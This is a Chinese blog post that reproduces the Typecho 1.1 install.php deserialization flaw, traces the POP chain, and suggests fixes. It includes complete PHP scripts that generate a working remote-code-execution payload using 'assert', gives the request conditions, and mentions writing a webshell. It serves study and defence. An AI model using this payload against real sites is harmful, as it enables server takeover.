@@ -1,0 +1,589 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/tu.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/tu.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/tu.ico">
+  <link rel="mask-icon" href="/images/tu.ico" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"mayi077.github.io","root":"/","scheme":"Mist","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":"ture","style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":"ture"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":"ture","mediumzoom":false,"lazyload":"ture","pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":3,"unescape":"ture","preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="这是17年的老洞了。最近刷题突然刷到这个漏洞，本着弄清原理的心态进行了这次的漏洞复现分析。 typecho 是什么？typecho是一个小型的博客程序。它基于PHP，可使用多种数据库进行数据存储。 环境搭建下载源码：【Typecho 1.1】安装时需要注意，提前在数据库中创建一个指定库名的库。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Typecho install.php存在的反序列化漏洞">
+<meta property="og:url" content="https://mayi077.github.io/2020/10/11/Typecho-install-php%E5%AD%98%E5%9C%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="信安小蚂蚁">
+<meta property="og:description" content="这是17年的老洞了。最近刷题突然刷到这个漏洞，本着弄清原理的心态进行了这次的漏洞复现分析。 typecho 是什么？typecho是一个小型的博客程序。它基于PHP，可使用多种数据库进行数据存储。 环境搭建下载源码：【Typecho 1.1】安装时需要注意，提前在数据库中创建一个指定库名的库。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic.downk.cc/item/5f819d4a1cd1bbb86b3656e3.jpg">
+<meta property="og:image" content="https://pic.downk.cc/item/5f81a4451cd1bbb86b3eb1fd.jpg">
+<meta property="og:image" content="https://pic.downk.cc/item/5f81a69f1cd1bbb86b41c3fb.jpg">
+<meta property="og:image" content="https://pic.downk.cc/item/5f81a7e11cd1bbb86b437057.jpg">
+<meta property="og:image" content="https://pic.downk.cc/item/5f81ac7b1cd1bbb86b48f974.jpg">
+<meta property="og:image" content="https://pic.downk.cc/item/5f81b1251cd1bbb86b4e5cb0.jpg">
+<meta property="og:image" content="https://pic.downk.cc/item/5f81b2071cd1bbb86b4f4e3f.jpg">
+<meta property="og:image" content="https://pic.downk.cc/item/5f81b2821cd1bbb86b4fc9a2.jpg">
+<meta property="og:image" content="https://pic.downk.cc/item/5f81b3361cd1bbb86b508e19.jpg">
+<meta property="og:image" content="https://pic.downk.cc/item/5f82609f1cd1bbb86b04e9c6.jpg">
+<meta property="og:image" content="https://pic.downk.cc/item/5f83c0541cd1bbb86ba7fab1.jpg">
+<meta property="og:image" content="https://pic.downk.cc/item/5f83c19a1cd1bbb86ba9424b.jpg">
+<meta property="og:image" content="https://pic.downk.cc/item/5f83c1f41cd1bbb86ba9a0c3.jpg">
+<meta property="article:published_time" content="2020-10-11T03:08:18.000Z">
+<meta property="article:modified_time" content="2020-11-23T00:16:20.000Z">
+<meta property="article:author" content="信安小蚂蚁">
+<meta property="article:tag" content="漏洞复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.downk.cc/item/5f819d4a1cd1bbb86b3656e3.jpg">
+
+<link rel="canonical" href="https://mayi077.github.io/2020/10/11/Typecho-install-php%E5%AD%98%E5%9C%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>Typecho install.php存在的反序列化漏洞 | 信安小蚂蚁</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">信安小蚂蚁</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right"></div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-主页">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>主页</a>
+
+  </li>
+        <li class="menu-item menu-item-归档">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-标签">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-关于">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mayi077.github.io/2020/10/11/Typecho-install-php%E5%AD%98%E5%9C%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="信安小蚂蚁">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="信安小蚂蚁">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Typecho install.php存在的反序列化漏洞
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-10-11 11:08:18" itemprop="dateCreated datePublished" datetime="2020-10-11T11:08:18+08:00">2020-10-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-11-23 08:16:20" itemprop="dateModified" datetime="2020-11-23T08:16:20+08:00">2020-11-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞复现</span>
+                  </a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.5k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>14 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>这是17年的老洞了。最近刷题突然刷到这个漏洞，本着弄清原理的心态进行了这次的漏洞复现分析。</p>
+<h3 id="typecho-是什么？"><a href="#typecho-是什么？" class="headerlink" title="typecho 是什么？"></a>typecho 是什么？</h3><p>typecho是一个小型的博客程序。它基于PHP，可使用多种数据库进行数据存储。</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>下载源码：<a href="https://github.com/typecho/typecho/releases/tag/v1.1-15.5.12-beta" target="_blank" rel="noopener">【Typecho 1.1】</a><br>安装时需要注意，提前在数据库中创建一个指定库名的库。</p>
+<a id="more"></a>
+<h3 id="漏洞点验证"><a href="#漏洞点验证" class="headerlink" title="漏洞点验证"></a>漏洞点验证</h3><p>这是我们已经安装好的样子<a href="https://pic.downk.cc/item/5f819d4a1cd1bbb86b3656e3.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5f819d4a1cd1bbb86b3656e3.jpg" alt=""></a><br>我们需要做到如下：</p>
+<ol>
+<li>访问路径为：(一定要加finish)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...&#x2F;install.php?finish</span><br></pre></td></tr></table></figure></li>
+<li>头部的 referer 需要是本站，这里我们为:(只要是站点的父站都可以)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: http:&#x2F;&#x2F;127.0.0.1&#x2F;</span><br></pre></td></tr></table></figure></li>
+<li>cookie中或者post data 一个， __typecho_config=攻击代码<br>而这个攻击代码由下面脚本运行得来：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Typecho_Feed</span><br><span class="line">&#123;</span><br><span class="line">    const RSS1 &#x3D; &#39;RSS 1.0&#39;;</span><br><span class="line">    const RSS2 &#x3D; &#39;RSS 2.0&#39;;</span><br><span class="line">    const ATOM1 &#x3D; &#39;ATOM 1.0&#39;;</span><br><span class="line">    const DATE_RFC822 &#x3D; &#39;r&#39;;</span><br><span class="line">    const DATE_W3CDTF &#x3D; &#39;c&#39;;</span><br><span class="line">    const EOL &#x3D; &quot;\n&quot;;</span><br><span class="line">    private $_type;</span><br><span class="line">    private $_items;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;_type &#x3D; $this::RSS2;</span><br><span class="line">        $this-&gt;_items[0] &#x3D; array(</span><br><span class="line">            &#39;title&#39; &#x3D;&gt; &#39;1&#39;,</span><br><span class="line">            &#39;link&#39; &#x3D;&gt; &#39;1&#39;,</span><br><span class="line">            &#39;date&#39; &#x3D;&gt; 1508895132,</span><br><span class="line">            &#39;category&#39; &#x3D;&gt; array(new Typecho_Request()),</span><br><span class="line">            &#39;author&#39; &#x3D;&gt; new Typecho_Request(),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Typecho_Request</span><br><span class="line">&#123;</span><br><span class="line">    private $_params &#x3D; array();</span><br><span class="line">    private $_filter &#x3D; array();</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;_params[&#39;screenName&#39;] &#x3D; &#39;phpinfo()&#39;; &#x2F;&#x2F;这里将要被执行的函数</span><br><span class="line">        $this-&gt;_filter[0] &#x3D; &#39;assert&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$exp &#x3D; array(</span><br><span class="line">    &#39;adapter&#39; &#x3D;&gt; new Typecho_Feed(),</span><br><span class="line">    &#39;prefix&#39; &#x3D;&gt; &#39;typecho_&#39;</span><br><span class="line">);</span><br><span class="line">echo base64_encode(serialize($exp));</span><br></pre></td></tr></table></figure>
+最后结果如图证明漏洞点存在（当然我们也是可以写入shell的）：<br><a href="https://pic.downk.cc/item/5f81a4451cd1bbb86b3eb1fd.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5f81a4451cd1bbb86b3eb1fd.jpg" alt=""></a></li>
+</ol>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>首先我们找到反序列化的点，在install.php的230行：<a href="https://pic.downk.cc/item/5f81a69f1cd1bbb86b41c3fb.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5f81a69f1cd1bbb86b41c3fb.jpg" alt=""></a><br>接着我们追溯一下，<code>get</code> 方法。发现他会首先在cookie中找<code>__typecho_config</code>的值，如果找不到就会在post值中找<br><a href="https://pic.downk.cc/item/5f81a7e11cd1bbb86b437057.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5f81a7e11cd1bbb86b437057.jpg" alt=""></a><br>也就是说，这个反序列化的内容是我们可以控制的。怎么利用？我们注意到，下面有调用到我们刚刚反序列化的一部分值，跟近看看：<a href="https://pic.downk.cc/item/5f81ac7b1cd1bbb86b48f974.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5f81ac7b1cd1bbb86b48f974.jpg" alt=""></a><br>发现有一个字符拼接的语句，那么如果把<code>$config[&#39;adapter&#39;]</code> 赋值为一个对象，就会调用其的 <code>__toString</code> 方法。 我们全局搜索一下<code>toSting</code>，<br>。注意到Feed.php跟近：<br><a href="https://pic.downk.cc/item/5f81b1251cd1bbb86b4e5cb0.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5f81b1251cd1bbb86b4e5cb0.jpg" alt=""></a><br>我们发现，<code>$item[&#39;author&#39;]-&gt;screenName</code>这里如果<code>$item[&#39;author&#39;]</code> 是一个对象，且不存在<code>screenName</code>属性时，会自动调用<code>__get</code>魔法函数。那么我门再全局搜索一下<code>__get</code>,定位到Request.php：<br><a href="https://pic.downk.cc/item/5f81b2071cd1bbb86b4f4e3f.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5f81b2071cd1bbb86b4f4e3f.jpg" alt=""></a><br>这里它会调用自己类的get方法，跟近一下：<a href="https://pic.downk.cc/item/5f81b2821cd1bbb86b4fc9a2.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5f81b2821cd1bbb86b4fc9a2.jpg" alt=""></a><br>它会给<code>$value</code>赋值，然后调用自己类的<code>_applyFilter($value)</code> 方法。跟近<a href="https://pic.downk.cc/item/5f81b3361cd1bbb86b508e19.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5f81b3361cd1bbb86b508e19.jpg" alt=""></a><br>这里发现了<code>call_user_func</code> 和<code>array_map</code>且 <code>_filter</code> 是初始化的我们可以自己构造值来控制，<code>$value</code> 是我们传进来的更加可以控制了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新的值的数组。</span><br></pre></td></tr></table></figure>
+<p>此时我们回头再注意下，我们最后的代码是被base64解码了的。而且有几个判断：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">install.php 59行开始</span><br><span class="line">if (!isset($_GET[&#39;finish&#39;]) &amp;&amp; file_exists(__TYPECHO_ROOT_DIR__ . &#39;&#x2F;config.inc.php&#39;) &amp;&amp; empty($_SESSION[&#39;typecho&#39;])) &#123;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们只需要get传一个<code>finish</code> 就可以绕过啦。除了这里还有个地方：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">install.php 64行后</span><br><span class="line">if (!empty($_GET) || !empty($_POST)) &#123;</span><br><span class="line">    if (empty($_SERVER[&#39;HTTP_REFERER&#39;])) &#123;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $parts &#x3D; parse_url($_SERVER[&#39;HTTP_REFERER&#39;]);</span><br><span class="line">	if (!empty($parts[&#39;port&#39;])) &#123;</span><br><span class="line">        $parts[&#39;host&#39;] &#x3D; &quot;&#123;$parts[&#39;host&#39;]&#125;:&#123;$parts[&#39;port&#39;]&#125;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (empty($parts[&#39;host&#39;]) || $_SERVER[&#39;HTTP_HOST&#39;] !&#x3D; $parts[&#39;host&#39;]) &#123;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里要求我们必须设置Referer 头，且它地址的 ip或域名 必须和这个漏洞网站一致（带端口）。<br>那么到这里我们就可以完美利用漏洞了。</p>
+<h3 id="构造-payload"><a href="#构造-payload" class="headerlink" title="构造 payload"></a>构造 payload</h3><p>首先我们明确要使用到2个类</p>
+<blockquote>
+<p>class Typecho_Feed、Typecho_Request</p>
+</blockquote>
+<h4 id="Typecho-Feed类构造"><a href="#Typecho-Feed类构造" class="headerlink" title="Typecho_Feed类构造"></a>Typecho_Feed类构造</h4><p>而我们在 Typecho_Feed ，关心的只有<code>private $_items</code>字段，但是我们注意到Feed.php的241行会调用<code>$this-&gt;dateFormat($item[&#39;date&#39;])</code> 如果dateFormat没有返回值这里就会报错并结束程序，我们跟近：<a href="https://pic.downk.cc/item/5f82609f1cd1bbb86b04e9c6.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5f82609f1cd1bbb86b04e9c6.jpg" alt=""></a><br>也就是这里要求我们<code>$_type</code>的值为ATOM 1.0、RSS 2.0、RSS 1.0 中的一个。这里随便提一下没有定义赋值的变量会默认赋空。<br>而我们关心的是<code>$item[&#39;author&#39;]-&gt;screenName</code> 其它数组键我们不用访问就可以执行到这一步从而去触发下一个的<code>__get()</code>。这边随便说一下，没有定义的数组键被访问时会警告并返回一个空值，并不会中止程序。此时我们所构造的<code>Typecho_Feed</code>类如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class Typecho_Feed</span><br><span class="line">&#123;</span><br><span class="line">    private $_type &#x3D; &#39;ATOM 1.0&#39;;</span><br><span class="line">    private $_items &#x3D; array();</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;_items[0] &#x3D; array(</span><br><span class="line">            &#x2F;*category 用于分支处理，如果不用于回显数据，此字段可以省略 。此处需要构造非空数组，且成员值为对象*&#x2F;</span><br><span class="line">            &#39;category&#39; &#x3D;&gt; array(new Typecho_Request()),</span><br><span class="line">            &#39;author&#39; &#x3D;&gt; new Typecho_Request(),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Typecho-Request-类构造"><a href="#Typecho-Request-类构造" class="headerlink" title="Typecho_Request 类构造"></a>Typecho_Request 类构造</h4><p>在这个类中，我们关心的是<code>private $_params</code>和<code>private $_filter</code> 根据前面的分析，我们只需要将<code>$_params[&#39;screenName&#39;] = &#39;执行函数&#39;;</code> 而<code>$_filter[0] = &#39;assert&#39;;</code>。也就是<code>$_filter[0]</code>为要调用的函数，而<code>$_params[&#39;screenName&#39;]</code> 则是被传的参数。（我们也可以利用<code>file_put_contents</code> 来写入shell木马文件） 所以最后我们构成的exp为:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Typecho_Feed</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    private $_type &#x3D; &#39;ATOM 1.0&#39;;</span><br><span class="line">    private $_items &#x3D; array();</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;_items[0] &#x3D; array(</span><br><span class="line">            &#x2F;*category 用于分支处理，如果不用于回显数据，此字段可以省略 。此处需要构造非空数组，且成员值为对象*&#x2F;</span><br><span class="line">            &#39;category&#39; &#x3D;&gt; array(new Typecho_Request()),</span><br><span class="line">            &#39;author&#39; &#x3D;&gt; new Typecho_Request(),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Typecho_Request</span><br><span class="line">&#123;</span><br><span class="line">    private $_params &#x3D; array();</span><br><span class="line">    private $_filter &#x3D; array();</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;_params[&#39;screenName&#39;] &#x3D; &#39;phpinfo();&#39;;</span><br><span class="line">        $this-&gt;_filter[0] &#x3D; &#39;assert&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$payload &#x3D; array(</span><br><span class="line">    &#39;adapter&#39; &#x3D;&gt; new Typecho_Feed(),</span><br><span class="line">    &#39;prefix&#39; &#x3D;&gt; &#39;test&#39; &#x2F;&#x2F;这里可以随意</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">echo base64_encode(serialize($payload));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>细心的人会发问，为什么<strong>Typecho_Feed类</strong>要有<code>&#39;category&#39; =&gt; array(new Typecho_Request())</code> 。<br>你还记得install.php中开始就调用了 <code>ob_start()</code>吗? 它是打开一个输出控制缓冲，将本该输出到页面的内容输出到了缓冲区。而后如果我们使用上面的payload会触发原本的<code>exception</code>，我们看到<code>Common.php</code>中设置了异常捕获函数：<br><a href="https://pic.downk.cc/item/5f83c0541cd1bbb86ba7fab1.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5f83c0541cd1bbb86ba7fab1.jpg" alt=""></a></p>
+<blockquote>
+<p>set_exception_handler(exception_function)<br>exception_function 规定未捕获到的异常发生时调用的函数。<br>注意：在这个异常处理程序被调用后，脚本会停止执行。</p>
+</blockquote>
+<p>我们追踪一下<code>exceptionHandle</code>，发现其使用了，<code>@ob_end_clean();</code>就是将我们的缓存全部清空，就不会输出任何东西。   <a href="https://pic.downk.cc/item/5f83c19a1cd1bbb86ba9424b.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5f83c19a1cd1bbb86ba9424b.jpg" alt=""></a><br>所以我们需要在它捕获到这个异常之前，结束程序。这边我们就是利用<code>category</code>来提前中止程序。<a href="https://pic.downk.cc/item/5f83c1f41cd1bbb86ba9a0c3.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5f83c1f41cd1bbb86ba9a0c3.jpg" alt=""></a><br>可以看到，假如我们<code>category</code> 是一个对象，<code>对象[]</code>这么调用会报致命错误，而不是未定义那么简单，它会直接中止程序。当然你也有其它方法进行提前退出程序而不会被捕获到 <code>exception</code> 例如利用<code>call_user_func</code> 调用函数来exit退出。</p>
+<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><ol>
+<li>删除网站根目录下的 install.php文件</li>
+<li>更新至最新版本</li>
+</ol>
+<h3 id="发散思考"><a href="#发散思考" class="headerlink" title="发散思考"></a>发散思考</h3><p>这个漏洞的是怎么被找到的？<br>按照常规，先使用seay、rips等代码审计工具自动审计一波，奇怪的是居然没有扫到这个点。<br>我们发现 install.php 还存在，随即就瞅瞅install.php的源码。<br>找找危险函数，逐个尝试发现有个反序列化，而且还被作为参数赋值给另一个对象，接着就是一系列的寻找利用函数。<br>当然我相信，第一次发现这个漏洞的也不是一眼就找到了这个点。也是经过多次尝试，最后发现这个点可行。<br>我因该再多积累经验多审计审计，然后就是要有耐心的去审计每一个cms，万一搞出个0day呢。</p>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MzAxNDY2MTQ2OQ==&mid=2650942666&idx=1&sn=5c84d6d69463a0a430e01dfa68c2d3ab&chksm=80796ef8b70ee7ee8ba5d88feb8d794bee19a55b6e17dff45fcee6ba6ee726fb4e2e029d50bd&scene=0#rd" target="_blank" rel="noopener">【参考链接】</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>信安小蚂蚁
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://mayi077.github.io/2020/10/11/Typecho-install-php%E5%AD%98%E5%9C%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="Typecho install.php存在的反序列化漏洞">https://mayi077.github.io/2020/10/11/Typecho-install-php存在的反序列化漏洞/</a>
+  </li>
+  <li class="post-copyright-license">
